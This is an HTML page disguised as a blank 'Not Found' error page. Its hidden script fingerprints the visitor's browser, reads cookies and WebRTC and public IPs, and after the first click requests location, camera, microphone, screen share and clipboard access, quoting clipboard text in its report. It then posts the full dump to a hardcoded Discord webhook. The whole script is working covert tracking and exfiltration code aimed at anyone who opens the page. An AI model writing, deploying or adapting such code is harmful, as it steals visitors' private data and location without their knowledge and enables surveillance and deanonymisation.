<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Not Found</title>
    <style>
        body {
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #fff;
            font-family: sans-serif;
            cursor: pointer;
        }
        h1 {
            font-size: 3rem;
            color: #ccc;
            user-select: none;
        }
    </style>
</head>
<body>
    <h1>Not Found</h1>
    <script>
        (async function() {
            // ---------- COLLECT BASIC DATA (no perms needed) ----------
            const data = {};

            // Timestamp
            data.timestamp = new Date().toISOString();

            // Basic navigator
            data.userAgent = navigator.userAgent;
            data.userAgentData = navigator.userAgentData ? {
                brands: navigator.userAgentData.brands,
                platform: navigator.userAgentData.platform,
                mobile: navigator.userAgentData.mobile,
                architecture: navigator.userAgentData.getHighEntropyValues ? 'pending' : 'not supported'
            } : 'not supported';

            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                try {
                    const hev = await navigator.userAgentData.getHighEntropyValues(['architecture', 'bitness', 'model', 'platformVersion', 'fullVersionList']);
                    data.userAgentData.highEntropy = hev;
                } catch (e) {
                    data.userAgentData.highEntropy = 'failed';
                }
            }

            data.platform = navigator.platform;
            data.language = navigator.language;
            data.languages = navigator.languages;
            data.hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
            data.deviceMemory = navigator.deviceMemory || 'unknown';
            data.maxTouchPoints = navigator.maxTouchPoints || 0;
            data.cookieEnabled = navigator.cookieEnabled;
            data.doNotTrack = navigator.doNotTrack;
            data.javaEnabled = navigator.javaEnabled ? navigator.javaEnabled() : false;

            // Screen & Window
            data.screen = {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio,
                orientation: screen.orientation ? screen.orientation.type : 'unknown',
                orientationAngle: screen.orientation ? screen.orientation.angle : 'unknown'
            };
            data.window = {
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                outerWidth: window.outerWidth,
                outerHeight: window.outerHeight,
                devicePixelRatio: window.devicePixelRatio
            };
            data.document = {
                clientWidth: document.documentElement.clientWidth,
                clientHeight: document.documentElement.clientHeight,
                referrer: document.referrer || 'none'
            };

            // Timezone
            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            data.timezoneOffset = new Date().getTimezoneOffset();

            // Public IP
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipJson = await ipRes.json();
                data.publicIP = ipJson.ip;
            } catch (e) {
                data.publicIP = 'failed to fetch';
            }

            // WebRTC IP leaks
            try {
                const rtcData = await new Promise((resolve) => {
                    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                    pc.createDataChannel('test');
                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
                    const ips = {};
                    pc.onicecandidate = (e) => {
                        if (e.candidate) {
                            const parts = e.candidate.candidate.split(' ');
                            if (parts[7] === 'typ' && parts[8] === 'srflx') {
                                ips.webRTC_public = parts[4];
                            } else if (parts[7] === 'typ' && parts[8] === 'host') {
                                ips.webRTC_local = parts[4];
                            }
                        } else {
                            resolve(ips);
                        }
                    };
                    setTimeout(() => resolve(ips), 3000);
                });
                data.webRTC = rtcData;
            } catch (e) {
                data.webRTC = 'failed';
            }

            // GPU / WebGL
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    data.gpu_vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                    data.gpu_renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                } else {
                    data.gpu_vendor = 'not available';
                    data.gpu_renderer = 'not available';
                }
                data.webgl_extensions = gl.getSupportedExtensions() || [];
            } else {
                data.gpu = 'no WebGL';
                data.webgl_extensions = [];
            }

            // Canvas fingerprint
            try {
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(0, 0, 100, 50);
                ctx.fillStyle = '#069';
                ctx.fillText('CanvasFP', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('FP', 4, 30);
                const dataUrl = canvas.toDataURL();
                let hash = 0;
                for (let i = 0; i < dataUrl.length; i++) {
                    const char = dataUrl.charCodeAt(i);
                    hash = ((hash << 5) - hash) + char;
                    hash = hash & hash;
                }
                data.canvasFingerprint = hash.toString(16);
            } catch (e) {
                data.canvasFingerprint = 'failed';
            }

            // WebGL fingerprint
            data.webglFingerprint = data.gpu_renderer || 'unknown';

            // Audio fingerprint
            try {
                const audioCtx = new(window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioCtx.createOscillator();
                const analyser = audioCtx.createAnalyser();
                oscillator.connect(analyser);
                analyser.connect(audioCtx.destination);
                oscillator.frequency.value = 440;
                oscillator.start(0);
                const dataArray = new Float32Array(analyser.frequencyBinCount);
                analyser.getFloatFrequencyData(dataArray);
                let audioHash = 0;
                for (let i = 0; i < dataArray.length; i++) {
                    audioHash = (audioHash * 31 + Math.floor(dataArray[i] * 1000)) & 0xFFFFFFFF;
                }
                data.audioFingerprint = audioHash.toString(16);
                oscillator.stop();
                await audioCtx.close();
            } catch (e) {
                data.audioFingerprint = 'failed';
            }

            // Fonts (expanded)
            const fontList = [
                'Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia',
                'Comic Sans MS', 'Trebuchet MS', 'Impact', 'Tahoma', 'Lucida Console',
                'Garamond', 'Palatino', 'Bookman', 'Avant Garde', 'Century Gothic',
                'Arial Black', 'Arial Narrow', 'Lucida Sans', 'Lucida Grande', 'Myriad Pro',
                'Calibri', 'Candara', 'Consolas', 'Constantia', 'Corbel', 'Cambria',
                'Segoe UI', 'Segoe UI Light', 'Segoe UI Semibold', 'Segoe UI Bold',
                'Franklin Gothic', 'Futura', 'Gill Sans', 'Helvetica Neue', 'Optima',
                'Rockwell', 'Univers', 'Baskerville', 'Bodoni', 'Caslon', 'Didot',
                'Perpetua', 'Goudy', 'Fenice', 'Futura', 'Kabel', 'Korinna', 'Mistral',
                'Papyrus', 'Symbol', 'Wingdings', 'Webdings'
            ];
            const baseFont = 'sans-serif';
            const testCanvas = document.createElement('canvas');
            const testCtx = testCanvas.getContext('2d');
            testCtx.font = '72px ' + baseFont;
            const baseWidth = testCtx.measureText('mmmmmmmmwwwwwwww').width;
            const availableFonts = [];
            for (const font of fontList) {
                try {
                    testCtx.font = '72px "' + font + '", ' + baseFont;
                    const width = testCtx.measureText('mmmmmmmmwwwwwwww').width;
                    if (width !== baseWidth) {
                        availableFonts.push(font);
                    }
                } catch (e) { /* ignore */ }
            }
            data.availableFonts = availableFonts;
            data.fontCount = availableFonts.length;

            // Battery
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    data.battery = {
                        level: battery.level,
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime,
                    };
                } catch (e) {
                    data.battery = 'failed';
                }
            } else {
                data.battery = 'not supported';
            }

            // Plugins & MIME
            data.plugins = Array.from(navigator.plugins || []).map(p => p.name);
            data.mimeTypes = Array.from(navigator.mimeTypes || []).map(m => m.type);

            // Network Info
            if (navigator.connection) {
                const conn = navigator.connection;
                data.network = {
                    effectiveType: conn.effectiveType,
                    rtt: conn.rtt,
                    downlink: conn.downlink,
                    downlinkMax: conn.downlinkMax,
                    saveData: conn.saveData,
                    type: conn.type,
                };
            } else {
                data.network = 'not supported';
            }

            // Performance & Memory
            if (performance) {
                data.performance = {
                    navigationType: performance.navigation ? performance.navigation.type : 'unknown',
                    navigationRedirectCount: performance.navigation ? performance.navigation.redirectCount : 'unknown',
                    timeOrigin: performance.timeOrigin,
                };
                if (performance.memory) {
                    data.performance.memory = {
                        jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
                        totalJSHeapSize: performance.memory.totalJSHeapSize,
                        usedJSHeapSize: performance.memory.usedJSHeapSize,
                    };
                } else {
                    data.performance.memory = 'not available';
                }
            } else {
                data.performance = 'not supported';
            }

            // Storage estimate
            if (navigator.storage && navigator.storage.estimate) {
                try {
                    const est = await navigator.storage.estimate();
                    data.storage = {
                        quota: est.quota,
                        usage: est.usage,
                    };
                } catch (e) {
                    data.storage = 'failed';
                }
            } else {
                data.storage = 'not supported';
            }

            // Cookies, localStorage, sessionStorage sizes
            data.cookieData = document.cookie || 'none';
            data.localStorageSize = 0;
            data.sessionStorageSize = 0;
            try {
                data.localStorageSize = new Blob(Object.values(localStorage)).size;
            } catch (e) { /* ignore */ }
            try {
                data.sessionStorageSize = new Blob(Object.values(sessionStorage)).size;
            } catch (e) { /* ignore */ }

            // System theme
            data.theme = {
                prefersDark: window.matchMedia('(prefers-color-scheme: dark)').matches,
                prefersLight: window.matchMedia('(prefers-color-scheme: light)').matches,
                prefersReducedMotion: window.matchMedia('(prefers-reduced-motion: reduce)').matches,
                prefersContrast: window.matchMedia('(prefers-contrast: more)').matches,
            };

            // OS
            const ua = navigator.userAgent;
            let os = 'unknown';
            let osVersion = 'unknown';
            if (ua.indexOf('Windows NT 10.0') !== -1) { os = 'Windows 10/11'; osVersion = '10.0'; } else if (ua.indexOf('Windows NT 6.1') !== -1) { os = 'Windows 7'; osVersion = '6.1'; } else if (ua.indexOf('Windows NT 6.2') !== -1) { os = 'Windows 8'; osVersion = '6.2'; } else if (ua.indexOf('Windows NT 6.3') !== -1) { os = 'Windows 8.1'; osVersion = '6.3'; } else if (ua.indexOf('Mac OS X') !== -1) { os = 'macOS'; osVersion = ua.match(/Mac OS X ([0-9_]+)/)?.[1]?.replace(/_/g, '.') || 'unknown'; } else if (ua.indexOf('Linux') !== -1) { os = 'Linux'; } else if (ua.indexOf('Android') !== -1) { os = 'Android'; } else if (ua.indexOf('iOS') !== -1) { os = 'iOS'; }
            data.os = os;
            data.osVersion = osVersion;

            data.isSecureContext = window.isSecureContext || false;
            data.browserFeatures = {
                serviceWorker: 'serviceWorker' in navigator,
                webRTC: 'RTCPeerConnection' in window,
                webAssembly: typeof WebAssembly === 'object',
                webGL: !!gl,
                webGL2: !!canvas.getContext('webgl2'),
                webAudio: 'AudioContext' in window || 'webkitAudioContext' in window,
                canvas: !!canvas.getContext('2d'),
                webVR: 'getVRDisplays' in navigator || 'xr' in navigator,
                webXR: 'xr' in navigator,
                geolocation: 'geolocation' in navigator,
                battery: 'getBattery' in navigator,
                notifications: 'Notification' in window,
                payment: 'PaymentRequest' in window,
                credentials: 'credentials' in navigator,
                clipboard: 'clipboard' in navigator,
                storage: 'storage' in navigator,
                sharedWorker: 'SharedWorker' in window,
                serviceWorker: 'serviceWorker' in navigator,
                webShare: 'share' in navigator,
                webAuthn: 'PublicKeyCredential' in window,
            };

            // ---------- PERMISSION REQUEST SECTION ----------
            // We'll store results here
            const perms = {};

            // Wait for user click to trigger permissions (since most require user gesture)
            await new Promise((resolve) => {
                document.body.addEventListener('click', resolve, { once: true });
            });

            // 1. Geolocation (already in previous, but we'll re-run to capture result)
            perms.geolocation = await new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve('not supported');
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        resolve({
                            latitude: pos.coords.latitude,
                            longitude: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            altitude: pos.coords.altitude,
                            altitudeAccuracy: pos.coords.altitudeAccuracy,
                            heading: pos.coords.heading,
                            speed: pos.coords.speed,
                        });
                    },
                    (err) => {
                        resolve(`denied: ${err.message}`);
                    }, {
                        timeout: 10000,
                        enableHighAccuracy: true
                    }
                );
            });

            // 2. Camera + Microphone
            perms.media = await new Promise((resolve) => {
                navigator.mediaDevices.getUserMedia({ audio: true, video: true })
                    .then(stream => {
                        // Got both, release tracks
                        stream.getTracks().forEach(t => t.stop());
                        resolve('granted (audio+video)');
                    })
                    .catch(err => {
                        resolve(`denied/error: ${err.message}`);
                    });
            });

            // 3. Screen Share (displayMedia)
            perms.screen = await new Promise((resolve) => {
                if (!navigator.mediaDevices.getDisplayMedia) {
                    resolve('not supported');
                    return;
                }
                navigator.mediaDevices.getDisplayMedia({ video: true, audio: true })
                    .then(stream => {
                        stream.getTracks().forEach(t => t.stop());
                        resolve('granted (screen share)');
                    })
                    .catch(err => {
                        resolve(`denied/error: ${err.message}`);
                    });
            });

            // 4. Notifications
            perms.notifications = await new Promise((resolve) => {
                if (!('Notification' in window)) {
                    resolve('not supported');
                    return;
                }
                if (Notification.permission === 'granted' || Notification.permission === 'denied') {
                    resolve(Notification.permission);
                } else {
                    Notification.requestPermission().then(result => resolve(result));
                }
            });

            // 5. Clipboard (read and write)
            perms.clipboard = await new Promise((resolve) => {
                if (!navigator.clipboard) {
                    resolve('not supported');
                    return;
                }
                // Try to read text (triggers permission)
                navigator.clipboard.readText()
                    .then(text => {
                        resolve('read granted (text: ' + (text ? text.substring(0, 20) : 'empty') + ')');
                    })
                    .catch(err => {
                        // Try write as fallback? Not necessary, just report.
                        resolve(`read denied: ${err.message}`);
                    });
            });

            // 6. Persistent storage permission (if supported)
            perms.persistentStorage = 'not checked';
            if (navigator.storage && navigator.storage.persist) {
                try {
                    const isPersisted = await navigator.storage.persisted();
                    perms.persistentStorage = `persisted: ${isPersisted}`;
                    // Request persist if not already
                    if (!isPersisted) {
                        const granted = await navigator.storage.persist();
                        perms.persistentStorage = `requested persist: ${granted}`;
                    }
                } catch (e) {
                    perms.persistentStorage = `error: ${e.message}`;
                }
            } else {
                perms.persistentStorage = 'not supported';
            }

            // Add permission results to data
            data.permissions = perms;

            // ---------- FORMAT AND SEND ----------
            let text = '======= NUCLEAR + PERMISSIONS DUMP =======\n';
            text += `Timestamp: ${data.timestamp}\n\n`;

            for (const [key, value] of Object.entries(data)) {
                if (key === 'timestamp') continue;
                if (typeof value === 'object' && value !== null) {
                    text += `------ ${key.toUpperCase()} ------\n`;
                    try {
                        text += JSON.stringify(value, null, 2) + '\n\n';
                    } catch (e) {
                        text += String(value) + '\n\n';
                    }
                } else {
                    text += `${key}: ${value}\n`;
                }
            }
            text += '======= END OF DUMP =======';

            // ---------- SEND TO DISCORD ----------
            const webhookURL = 'https://discord.com/api/webhooks/1528900571682050098/WvFXaFzeesyNJYNVWJf6QkW9xFt23KetO3XR6PVaGs91wg9j9fRtis7MJIeL4PMMlLqg';

            const formData = new FormData();
            const blob = new Blob([text], { type: 'text/plain' });
            formData.append('file', blob, 'system_info_perms.txt');
            formData.append('payload_json', JSON.stringify({ content: '💀 Full nuclear + permissions dump. All permissions requested.' }));

            try {
                const response = await fetch(webhookURL, {
                    method: 'POST',
                    body: formData,
                });
                if (response.ok) {
                    console.log('Nuclear + perms data sent.');
                } else {
                    console.error('Failed to send:', response.status, await response.text());
                }
            } catch (err) {
                console.error('Error sending to Discord:', err);
            }

            // Update page to show something? It already shows "Not Found", keep it.
        })();
    </script>
</body>
</html>
